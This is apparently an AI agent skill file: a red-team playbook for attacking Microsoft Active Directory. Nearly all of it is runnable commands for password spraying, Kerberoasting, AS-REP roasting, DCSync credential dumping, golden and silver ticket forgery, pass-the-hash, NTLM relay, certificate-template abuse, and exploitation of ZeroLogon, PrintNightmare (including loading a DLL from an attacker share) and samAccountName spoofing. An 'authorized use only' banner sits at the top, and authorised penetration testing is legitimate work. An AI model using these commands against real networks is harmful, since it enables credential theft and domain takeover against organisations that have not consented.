---
name: active-directory-attacks
description: "Comprehensive Active Directory attack techniques for authorized penetration testing and red team operations. Covers reconnaissance, credential harvesting, Kerberos attacks, lateral movement, privilege escalation, and domain dominance."
version: 1.0.0
author: Cyberfox Agent
license: MIT
metadata:
  cyberfox:
    tags: [red-teaming, active-directory, kerberos, privilege-escalation, lateral-movement, pentest]
    related_skills: [red-teaming/red-team-tactics, red-teaming/ethical-hacking-methodology, ares/recon, ares/exploit]
    category: red-teaming
---

> AUTHORIZED USE ONLY: Use this skill only for authorized security assessments, defensive validation, or controlled educational environments.

# Active Directory Attacks

## Purpose

Provide comprehensive techniques for attacking Microsoft Active Directory environments. Covers reconnaissance, credential harvesting, Kerberos attacks, lateral movement, privilege escalation, and domain dominance for red team operations and penetration testing.

## Prerequisites

- Kali Linux or Windows attack platform
- Domain user credentials (for most attacks)
- Network access to Domain Controller
- Tools: Impacket, Mimikatz, BloodHound, Rubeus, CrackMapExec, Certipy, Kerbrute

## Core Workflow

### Phase 1: Initial Reconnaissance & Clock Sync

**Kerberos Clock Synchronization** - Critical before any Kerberos attacks:

```bash
# Detect clock skew
nmap -sT <DC_IP> -p445 --script smb2-time

# Fix clock on Linux
sudo date -s "14 APR 2024 18:25:16"

# Fix clock on Windows
net time /domain /set

# Fake clock without changing system time
faketime -f '+8h' <command>
```

### Phase 2: AD Reconnaissance with BloodHound

```bash
# Start BloodHound
neo4j console
bloodhound --no-sandbox

# Collect data with SharpHound (Windows)
.\SharpHound.exe -c All
.\SharpHound.exe -c All --ldapusername user --ldappassword pass

# Python collector (from Linux)
bloodhound-python -u 'user' -p 'password' -d domain.local -ns 10.10.10.10 -c all
```

### Phase 3: PowerView Enumeration

```powershell
# Domain information
Get-NetDomain
Get-DomainSID
Get-NetDomainController

# User enumeration
Get-NetUser
Get-NetUser -SamAccountName targetuser
Get-UserProperty -Properties pwdlastset

# Group enumeration
Get-NetGroupMember -GroupName "Domain Admins"
Get-DomainGroup -Identity "Domain Admins" | Select-Object -ExpandProperty Member

# Local admin access discovery
Find-LocalAdminAccess -Verbose

# User hunting
Invoke-UserHunter
Invoke-UserHunter -Stealth
```

---

## Credential Attacks

### Password Spraying

```bash
# Using kerbrute
./kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt Password123

# Using CrackMapExec
crackmapexec smb 10.10.10.10 -u users.txt -p 'Password123' --continue-on-success
```

### Kerberoasting

Extract service account TGS tickets and crack offline:

```bash
# Impacket
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10 -request -outputfile hashes.txt

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.txt

# CrackMapExec
crackmapexec ldap 10.10.10.10 -u user -p password --kerberoast output.txt

# Crack with hashcat
hashcat -m 13100 hashes.txt rockyou.txt
```

### AS-REP Roasting

Target accounts with "Do not require Kerberos preauthentication":

```bash
# Impacket
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.10 -format hashcat

# Rubeus
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt

# Crack with hashcat
hashcat -m 18200 hashes.txt rockyou.txt
```

### DCSync Attack

Extract credentials directly from DC (requires Replicating Directory Changes rights):

```bash
# Impacket
secretsdump.py domain.local/admin:password@10.10.10.10 -just-dc-user krbtgt

# Mimikatz
lsadump::dcsync /domain:domain.local /user:krbtgt
lsadump::dcsync /domain:domain.local /user:Administrator
```

---

## Kerberos Ticket Attacks

### Golden Ticket

Forge TGT with krbtgt hash for any user:

```powershell
# Get krbtgt hash via DCSync first
# Mimikatz - Create Golden Ticket
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:HASH /id:500 /ptt

# Impacket
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-xxx -domain domain.local Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass domain.local/Administrator@dc.domain.local
```

### Silver Ticket

Forge TGS for specific service:

```powershell
# Mimikatz
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:cifs /rc4:SERVICE_HASH /ptt
```

### Pass-the-Hash

```bash
# Impacket
psexec.py domain.local/Administrator@10.10.10.10 -hashes :NTHASH
wmiexec.py domain.local/Administrator@10.10.10.10 -hashes :NTHASH
smbexec.py domain.local/Administrator@10.10.10.10 -hashes :NTHASH

# CrackMapExec
crackmapexec smb 10.10.10.10 -u Administrator -H NTHASH -d domain.local
crackmapexec smb 10.10.10.10 -u Administrator -H NTHASH --local-auth
```

### OverPass-the-Hash

Convert NTLM hash to Kerberos ticket:

```bash
# Impacket
getTGT.py domain.local/user -hashes :NTHASH
export KRB5CCNAME=user.ccache

# Rubeus
.\Rubeus.exe asktgt /user:user /rc4:NTHASH /ptt
```

---

## NTLM Relay Attacks

### Responder + ntlmrelayx

```bash
# Start Responder (disable SMB/HTTP for relay)
responder -I eth0 -wrf

# Start relay
ntlmrelayx.py -tf targets.txt -smb2support

# LDAP relay for delegation attack
ntlmrelayx.py -t ldaps://dc.domain.local -wh attacker-wpad --delegate-access
```

### SMB Signing Check

```bash
crackmapexec smb 10.10.10.0/24 --gen-relay-list targets.txt
```

---

## Certificate Services Attacks (AD CS)

### ESC1 - Misconfigured Templates

```bash
# Find vulnerable templates
certipy find -u user@domain.local -p password -dc-ip 10.10.10.10

# Exploit ESC1
certipy req -u user@domain.local -p password -ca CA-NAME -target dc.domain.local -template VulnTemplate -upn administrator@domain.local

# Authenticate with certificate
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
```

### ESC8 - Web Enrollment Relay

```bash
ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

---

## Critical CVEs

### ZeroLogon (CVE-2020-1472)

```bash
# Check vulnerability
crackmapexec smb 10.10.10.10 -u '' -p '' -M zerologon

# Exploit
python3 cve-2020-1472-exploit.py DC01 10.10.10.10

# Extract hashes
secretsdump.py -just-dc domain.local/DC01$@10.10.10.10 -no-pass

# Restore password (IMPORTANT!)
python3 restorepassword.py domain.local/DC01@DC01 -target-ip 10.10.10.10 -hexpass HEXPASSWORD
```

### PrintNightmare (CVE-2021-1675)

```bash
# Check for vulnerability
rpcdump.py @10.10.10.10 | grep 'MS-RPRN'

# Exploit (requires hosting malicious DLL)
python3 CVE-2021-1675.py domain.local/user:pass@10.10.10.10 '\\attacker\share\evil.dll'
```

### samAccountName Spoofing (CVE-2021-42278/42287)

```bash
# Automated exploitation
python3 sam_the_admin.py "domain.local/user:password" -dc-ip 10.10.10.10 -shell
```

---

## Quick Reference

| Attack | Tool | Command |
|--------|------|---------|
| Kerberoast | Impacket | `GetUserSPNs.py domain/user:pass -request` |
| AS-REP Roast | Impacket | `GetNPUsers.py domain/ -usersfile users.txt` |
| DCSync | secretsdump | `secretsdump.py domain/admin:pass@DC` |
| Pass-the-Hash | psexec | `psexec.py domain/user@target -hashes :HASH` |
| Golden Ticket | Mimikatz | `kerberos::golden /user:Admin /krbtgt:HASH` |
| Spray | kerbrute | `kerbrute passwordspray -d domain users.txt Pass` |

---

## Constraints

**Must:**
- Synchronize time with DC before Kerberos attacks
- Have valid domain credentials for most attacks
- Document all compromised accounts

**Must Not:**
- Lock out accounts with excessive password spraying
- Modify production AD objects without approval
- Leave Golden Tickets without documentation

**Should:**
- Run BloodHound for attack path discovery
- Check for SMB signing before relay attacks
- Verify patch levels for CVE exploitation

---

## Troubleshooting

| Issue | Solution |
|-------|----------|
| Clock skew too great | Sync time with DC or use faketime |
| Kerberoasting returns empty | No service accounts with SPNs |
| DCSync access denied | Need Replicating Directory Changes rights |
| NTLM relay fails | Check SMB signing, try LDAP target |
| BloodHound empty | Verify collector ran with correct creds |

---

## Additional Resources

For advanced techniques including delegation attacks, GPO abuse, RODC attacks, SCCM/WSUS deployment, ADCS exploitation, trust relationships, and Linux AD integration, see `references/advanced-attacks.md`.

## When to Use

This skill is applicable to execute the workflow or actions described in the overview.